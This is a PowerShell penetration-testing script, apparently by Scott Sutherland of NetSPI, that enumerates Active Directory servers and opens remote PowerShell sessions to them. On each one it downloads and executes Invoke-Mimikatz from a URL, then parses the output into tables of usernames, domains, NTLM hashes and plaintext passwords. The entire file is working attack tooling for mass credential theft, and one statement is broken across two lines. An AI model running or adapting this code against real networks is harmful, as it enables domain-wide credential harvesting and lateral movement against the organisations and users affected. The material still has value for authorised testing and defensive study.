# Author: Scott Sutherland (@_nullbind), 2015 NetSPI
# Description:  This can be used to massmimikatz servers with registered winrm SPNs from a non domain system.
# Example: PS C:\> Invoke-MassMimikatz-PsRemoting -DomainController dc1.acme.com -Credential acme\user -MaxHost 10 -verbose
# Example: PS C:\> Invoke-MassMimikatz-PsRemoting -DomainController dc1.acme.com -Credential acme\user -MaxHost 10 -OsFilter "2012" - verbose
# Example: PS C:\> Invoke-MassMimikatz-PsRemoting -DomainController dc1.acme.com -Credential acme\user -MaxHost 10 -PsUrl "https://10.1.1.1/Invoke-Mimikatz.ps1" -verbose
# Example: PS C:\> Invoke-MassMimikatz-PsRemoting -DomainController dc1.acme.com -Credential acme\user -MaxHost 10 -DomainController 10.1.1.1 -Credential  -verbose
# Note: this is based on work done by rob fuller, JosephBialek, carlos perez, benjamin delpy, and will schroeder.
# Just for fun.

function Invoke-MassMimikatz-PsRemoting
{
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory=$false,
        HelpMessage="Credentials to use when connecting to a Domain Controller.")]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,
        
        [Parameter(Mandatory=$false,
        HelpMessage="Domain controller for Domain and Site that you want to query against.")]
        [string]$DomainController,

        [Parameter(Mandatory=$false,
        HelpMessage="This limits how many servers to run mimikatz on.")]
        [int]$MaxHosts = 5,

        [Parameter(Mandatory=$false,
        HelpMessage="Limit results by the provided operating system. Default is all.")]
        [string]$OsFilter = "*",

        [Parameter(Mandatory=$false,
        HelpMessage="Limit results by only include servers with registered winrm services.")]
        [switch]$WinRM,

        [Parameter(Mandatory=$false,
        HelpMessage="Set the url to download invoke-mimikatz.ps1 from.  The default is the github repo.")]
        [string]$PsUrl = "https://raw.githubusercontent.com/clymb3r/PowerShell/master/Invoke-Mimikatz/Invoke-Mimikatz.ps1",

        [Parameter(Mandatory=$false,
        HelpMessage="Maximum number of Objects to pull from AD, limit is 1,000 .")]
        [int]$Limit = 1000,

        [Parameter(Mandatory=$false,
        HelpMessage="scope of a search as either a base, one-level, or subtree search, default is subtree.")]
        [ValidateSet("Subtree","OneLevel","Base")]
        [string]$SearchScope = "Subtree",

        [Parameter(Mandatory=$false,
        HelpMessage="Distinguished Name Path to limit search to.")]

        [string]$SearchDN
    )
    Begin
    {
        if ($DomainController -and $Credential.GetNetworkCredential().Password)
        {
            $objDomain = New-Object System.DirectoryServices.DirectoryEntry "LDAP://$($DomainController)", $Credential.UserName,$Credential.GetNetworkCredential().Password
            $objSearcher = New-Object System.DirectoryServices.DirectorySearcher $objDomain
        }
        else
        {
            $objDomain = [ADSI]""  
            $objSearcher = New-Object System.DirectoryServices.DirectorySearcher $objDomain
        }
    }

    Process
    {

        # ----------------------------------------
        # Get the list of domain computers
        # ----------------------------------------

        Write-verbose "Getting list of Servers with WinRM installed from DC..."

        # Create data table to house results
        $TblServers2012 = New-Object System.Data.DataTable 
        $TblServers2012.Columns.Add("ComputerName") | Out-Null

        # Get domain computers from dc 
        if ($OsFilter -eq "*"){
            $OsCompFilter = "(operatingsystem=*)"
        }else{
            $OsCompFilter = "(operatingsystem=*$OsFilter*)"
        }

        # Select winrm spns if flagged
        if($WinRM){
            $winrmComFilter = "(servicePrincipalName=*WSMAN*)"
        }else{
            $winrmComFilter = ""
        }

        $CompFilter = "(&(objectCategory=Computer)$winrmComFilter $OsCompFilter)"        
        $ObjSearcher.PageSize = $Limit
        $ObjSearcher.Filter = $CompFilter
        $ObjSearcher.SearchScope = "Subtree"

        if ($SearchDN)
        {
            $objSearcher.SearchDN = New-Object System.DirectoryServices.DirectoryEntry("LDAP://$($SearchDN)")         
        }

        $ObjSearcher.FindAll() | ForEach-Object {
            
            #add server to data table
            $ComputerName = [string]$_.properties.dnshostname
            $TblServers2012.Rows.Add($ComputerName) | Out-Null 
        }


        # ----------------------------------------
        # Mimikatz prase function (Will Schoeder's) 
        # ----------------------------------------        
        # This is a *very slightly mod version of will schroeder's function from:
        # https://raw.githubusercontent.com/Veil-Framework/PowerTools/master/PewPewPew/Invoke-MassMimikatz.ps1
        function Parse-Mimikatz {

            [CmdletBinding()]
            param(
                [string]$raw
            )
    
            # Create data table to house results
            $TblPasswords = New-Object System.Data.DataTable 
            $TblPasswords.Columns.Add("Type") | Out-Null
            $TblPasswords.Columns.Add("Domain") | Out-Null
            $TblPasswords.Columns.Add("Username") | Out-Null
            $TblPasswords.Columns.Add("Password") | Out-Null    

            # msv
	        $results = $raw | Select-String -Pattern "(?s)(?<=msv :).*?(?=tspkg :)" -AllMatches | %{$_.matches} | %{$_.value}
            if($results){
                foreach($match in $results){
                    if($match.Contains("Domain")){
                        $lines = $match.split("`n")
                        foreach($line in $lines){
                            if ($line.Contains("Username")){
                                $username = $line.split(":")[1].trim()
                            }
                            elseif ($line.Contains("Domain")){
                                $domain = $line.split(":")[1].trim()
                            }
                            elseif ($line.Contains("NTLM")){
                                $password = $line.split(":")[1].trim()
                            }
                        }
                        if ($password -and $($password -ne "(null)")){
                            #$username+"/"+$domain+":"+$password
                            $type = "msv"
                            $TblPasswords.Rows.Add($type,$domain,$username,$password) | Out-Null 
                        }
                    }
                }
            }
            $results = $raw | Select-String -Pattern "(?s)(?<=tspkg :).*?(?=wdigest :)" -AllMatches | %{$_.matches} | %{$_.value}
            if($results){
                foreach($match in $results){
                    if($match.Contains("Domain")){
                        $lines = $match.split("`n")
                        foreach($line in $lines){
                            if ($line.Contains("Username")){
                                $username = $line.split(":")[1].trim()
                            }
                            elseif ($line.Contains("Domain")){
                                $domain = $line.split(":")[1].trim()
                            }
                            elseif ($line.Contains("Password")){
                                $password = $line.split(":")[1].trim()
                            }
                        }
                        if ($password -and $($password -ne "(null)")){
                            #$username+"/"+$domain+":"+$password
                            $type = "wdigest/tspkg"
                            $TblPasswords
                            .Rows.Add($type,$domain,$username,$password) | Out-Null
                        }
                    }
                }
            }
            $results = $raw | Select-String -Pattern "(?s)(?<=wdigest :).*?(?=kerberos :)" -AllMatches | %{$_.matches} | %{$_.value}
            if($results){
                foreach($match in $results){
                    if($match.Contains("Domain")){
                        $lines = $match.split("`n")
                        foreach($line in $lines){
                            if ($line.Contains("Username")){
                                $username = $line.split(":")[1].trim()
                            }
                            elseif ($line.Contains("Domain")){
                                $domain = $line.split(":")[1].trim()
                            }
                            elseif ($line.Contains("Password")){
                                $password = $line.split(":")[1].trim()
                            }
                        }
                        if ($password -and $($password -ne "(null)")){
                            #$username+"/"+$domain+":"+$password
                            $type = "wdigest/kerberos"
                            $TblPasswords.Rows.Add($type,$domain,$username,$password) | Out-Null
                        }
                    }
                }
            }
            $results = $raw | Select-String -Pattern "(?s)(?<=kerberos :).*?(?=ssp :)" -AllMatches | %{$_.matches} | %{$_.value}
            if($results){
                foreach($match in $results){
                    if($match.Contains("Domain")){
                        $lines = $match.split("`n")
                        foreach($line in $lines){
                            if ($line.Contains("Username")){
                                $username = $line.split(":")[1].trim()
                            }
                            elseif ($line.Contains("Domain")){
                                $domain = $line.split(":")[1].trim()
                            }
                            elseif ($line.Contains("Password")){
                                $password = $line.split(":")[1].trim()
                            }
                        }
                        if ($password -and $($password -ne "(null)")){
                            #$username+"/"+$domain+":"+$password
                            $type = "kerberos/ssp"
                            $TblPasswords.Rows.Add($type,$domain,$username,$password) | Out-Null
                        }
                    }
                }
            }

            $TblPasswords_Clean = $TblPasswords | Where-Object { $_.username -notlike "*$"}
            return $TblPasswords_Clean
        }


        # ----------------------------------------
        # Establish sessions
        # ---------------------------------------- 
        $ServerCount = $TblServers2012.Rows.Count
        Write-Verbose "Found $ServerCount servers with winrm enabled."
        Write-verbose "Attempting to create $MaxHosts ps sessions..."

        # Set counters
        $Counter = 0     
        $SessionCount = 0   

        $TblServers2012 | 
        ForEach-Object {

            if ($Counter -le $ServerCount -and $SessionCount -lt $MaxHosts){
                $Counter = $Counter+1
                
                # Get session count
                $SessionCount = Get-PSSession | Measure-Object | select count -ExpandProperty count

                # attempt session
                [string]$MyComputer = $_.ComputerName    
                Write-Verbose "Established Sessions: $SessionCount of $MaxHosts - Processing server $Counter of $ServerCount"         
                New-PSSession -ComputerName $MyComputer -Credential $Credential -ErrorAction SilentlyContinue            
            }
        }                   


        # ----------------------------------------
        # Attempt to run mimikatz
        # ---------------------------------------- 
        if($SessionCount -ge 1){

            # run the mimikatz command
            Write-verbose "Running reflected Mimikatz against $SessionCount open ps sessions..."
            $x = Get-PSSession
            $MimikatzOutput = Invoke-Command -Session $x -ScriptBlock {Invoke-Expression (new-object System.Net.WebClient).DownloadString("$PsUrl");invoke-mimikatz}
            Parse-Mimikatz -raw $MimikatzOutput

            # remove sessions
            Write-verbose "Removing ps sessions..."
            Disconnect-PSSession -Session $x
            Remove-PSSession -Session $x

            # Clear datatable
            $TblServers2012.Clear()
        
        }else{
            Write-verbose "No ps sessions could be created."
        }
        
        Write-verbose "Done."
    }

    End
    {

    }
}

